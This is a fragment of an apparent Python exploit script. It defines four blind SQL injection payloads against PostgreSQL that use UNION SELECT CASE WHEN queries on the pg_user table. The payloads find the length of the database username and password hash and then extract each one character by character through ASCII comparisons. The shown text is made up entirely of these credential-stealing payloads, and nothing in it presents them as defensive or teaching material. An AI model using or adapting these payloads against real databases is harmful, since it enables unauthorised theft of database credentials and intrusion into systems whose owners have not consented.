...
def main():
	...
	USERNAME_SIZE_SQLI_STRING="1 UNION SELECT CASE WHEN (SELECT LENGTH(usename) FROM pg_user LIMIT 1)=[PLACEHOLDER] THEN 1 ELSE 0 END--"
	USERNAME_SQLI_STRING="1 UNION SELECT CASE WHEN (SELECT ASCII(SUBSTRING(usename FROM %d FOR 1)) FROM pg_user LIMIT 1)=[PLACEHOLDER] THEN 1 ELSE 0 END--"
	PASSWORD_SIZE_SQLI_STRING="1 UNION SELECT CASE WHEN (SELECT LENGTH(passwd) FROM pg_user LIMIT 1)=[PLACEHOLDER] THEN 1 ELSE 0 END--"
	PASSWORD_SQLI_STRING="1 UNION SELECT CASE WHEN (SELECT ASCII(SUBSTRING(passwd FROM %d FOR 1)) FROM pg_user LIMIT 1)=[PLACEHOLDER] THEN 1 ELSE 0 END--"
